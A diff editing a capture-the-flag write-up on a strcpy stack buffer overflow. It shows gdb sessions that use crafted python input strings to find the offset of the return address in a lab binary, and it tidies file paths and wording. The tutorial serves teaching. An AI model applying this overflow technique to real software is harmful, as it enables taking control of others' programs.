@@ -1,7 +1,5 @@
 ## Level 4: always check array boundaries
 
-todo: redo commands using the remote shell, espcially gdb
-
 The source code on this level is surprisingly simple:
 ```
 void fun(char *str) {
@@ -16,7 +14,7 @@ int main(int argc, char **argv) {
 }
 ```
 
-The problem is quite obvious:
+There is an obvious problem here:
 `strcpy` is well-known to be unsafe,
 as it does not check if the destination array has enough space to store the source array.
 With a sufficiently long command line argument we can overwrite the memory area beyond `buf` in the `fun` function.
@@ -88,7 +86,7 @@ We know that the content of the stack will look like this when we are inside `fu
 0x0400+?    the return address
 ```
 That is, the return address is somewhere soon after the end of the buffer.
-We can find the right position by using `gdb`.
+We can find the right position using `gdb`.
 When we overwrite the return address with something invalid,
 the program crashes with segmentation fault.
 When `gdb` reaches such code,
@@ -96,14 +94,13 @@ it prints out this wrong address.
 With a suitable input string and the output `gdb`,
 we can find out the precise location we will want to overwrite.
 
-Let's start the debugger:
-```
-```
-Let's run with a crafted input string,
+Let's start the debugger,
+and run the program with a crafted input string,
 hopefully overwriting the return address:
 ```
+level03@box:/levels/level04$ gdb ./level04
 (gdb) run $(python -c 'print "A" * 1100')
-Starting program: /storage/home/janos/dev/git/github/articles/hacking-contest-lessons/level04 $(python -c 'print "A" * 1100')
+Starting program: /levels/levels04/level04 $(python -c 'print "A" * 1100')
 
 Program received signal SIGSEGV, Segmentation fault.
 0x41414141 in ?? ()
@@ -113,7 +110,7 @@ Let's try a shorter string,
 and something that will help us guess the correct position better:
 ```
 (gdb) run $(python -c 'print "A" * 1024 + "abcdefghijklmnopqrstuvwxyz"')
-Starting program: /storage/home/janos/dev/git/github/articles/hacking-contest-lessons/level04 $(python -c 'print "A" * 1024 + "abcdefghijklmnopqrstuvwxyz"')
+Starting program: /levels/levels04/level04 $(python -c 'print "A" * 1024 + "abcdefghijklmnopqrstuvwxyz"')
 
 Program received signal SIGSEGV, Segmentation fault.
 0x706f6e6d in ?? ()
@@ -135,7 +132,7 @@ where the last 4 bytes will be the address we want to jump to.
 Let's verify this final number with one last test in `gdb`:
 ```
 (gdb) run $(python -c 'print "A" * 1036 + "mmmm"')
-Starting program: /storage/home/janos/dev/git/github/articles/hacking-contest-lessons/level04 $(python -c 'print "A" * 1036 + "mmmm"')
+Starting program: /levels/levels04/level04 $(python -c 'print "A" * 1036 + "mmmm"')
 
 Program received signal SIGSEGV, Segmentation fault.
 0x6d6d6d6d in ?? ()
